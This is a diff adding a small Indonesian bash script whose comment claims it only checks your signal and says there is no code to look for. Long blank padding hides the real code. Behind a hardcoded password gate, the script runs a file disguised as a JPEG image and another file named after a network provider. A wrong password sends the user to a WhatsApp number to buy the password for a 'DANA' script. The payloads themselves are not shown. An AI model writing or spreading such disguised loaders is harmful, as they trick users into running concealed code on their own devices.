@@ -1,0 +1,78 @@
+# INI CUMA TEMPAT MEMERIKSA SINYAL MU , GK USAH NYARI KODE
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+clear
+sleep 1.58
+echo -e "\e[92mMASUKAN ID & PASSWORD\e[0m";
+read -p 'ID : ' ID;
+#
+read -p 'PW : ' PW;
+#
+if [ "${PW}" != "FARHAN" ]
+then
+echo -e "\e[91m PASSWORD SALAH!!\e[0m";
+sleep 1.0
+clear
+echo -e "\e[92m MEMBUKA BROWSER/WA ANDA.\e[0m";
+sleep 0.59
+clear
+echo -e "\e[92m MEMBUKA BROWSER/WA ANDA..\e[0m";
+sleep 0.59
+clear
+echo -e "\e[92m MEMBUKA BROWSER/WA ANDA...\e[0m";
+sleep 1.0
+xdg-open https://api.whatsapp.com/send?phone=6281393668101&text=PW%20SCRIPT%20DANA
+clear
+bash __NETWORK_PROVIDER__
+fi
+if [ "${PW}" = "FARHAN" ]
+then
+clear
+bash screenshots18491931721.jpg
+fi
+
